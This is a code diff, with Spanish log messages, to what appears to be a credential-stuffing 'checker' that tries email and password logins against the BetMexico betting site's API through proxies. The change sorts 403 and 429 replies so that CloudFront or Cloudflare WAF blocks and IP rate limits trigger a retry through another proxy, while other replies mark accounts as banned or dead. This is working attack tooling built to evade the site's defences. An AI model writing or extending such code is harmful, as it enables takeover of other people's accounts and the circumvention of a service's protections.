@@ -593,9 +593,23 @@ class BetmexicoApiChecker:
                 # We mark as DEAD only if it's clearly a credentials issue or explicit lock
                 result["status"] = "DEAD"
 
-            elif status_code == 403 or status_code == 429:
-                logger.warning(f"[BAN] {status_code} Rate limit: {email}")
-                result["status"] = "BAN"
+            elif status_code == 403:
+                raw_txt = str(data.get("raw") or data)[:200]
+                logger.warning(f"[WAF_FORBIDDEN] 403 en login (bloqueo WAF/IP de CloudFront, cuenta intacta): {email} | resp: {raw_txt}")
+                result["status"] = "RETRY_PROXY"
+                result["error"] = "IP_WAF_FORBIDDEN_403"
+
+            elif status_code == 429:
+                raw_txt = str(data.get("raw") or data)[:200]
+                is_cf_ip_block = "cloudfront" in raw_txt.lower() or "cloudflare" in raw_txt.lower() or "<html" in raw_txt.lower()
+                if is_cf_ip_block:
+                    logger.warning(f"[IP_RATE_LIMIT] 429 de CloudFront/WAF en IP del proxy (no de la cuenta): {email} | resp: {raw_txt}")
+                    result["status"] = "RETRY_PROXY"
+                    result["error"] = "IP_RATE_LIMIT_429"
+                else:
+                    logger.warning(f"[BAN] 429 Rate limit de cuenta en BetMexico: {email} | resp: {raw_txt}")
+                    result["status"] = "BAN"
+                    result["error"] = "RATE_LIMITED_429"
 
             elif status_code >= 500:
                 logger.error(f"[ERROR-SERVER] {status_code} BetMexico inestable: {email}")
@@ -628,6 +642,9 @@ class BetmexicoApiChecker:
         }
 
         client = self._get_client()
+        proxy_url = self._get_httpx_proxy()
+        proxy_display = proxy_url.split("@")[-1] if proxy_url and "@" in proxy_url else (proxy_url or "DIRECTO (sin proxy)")
+        logger.info(f"[LOGIN] {email} | Proxy: {proxy_display}")
         resp = await client.post(
             BETMEXICO_URLS["api_login"],
             json=payload,
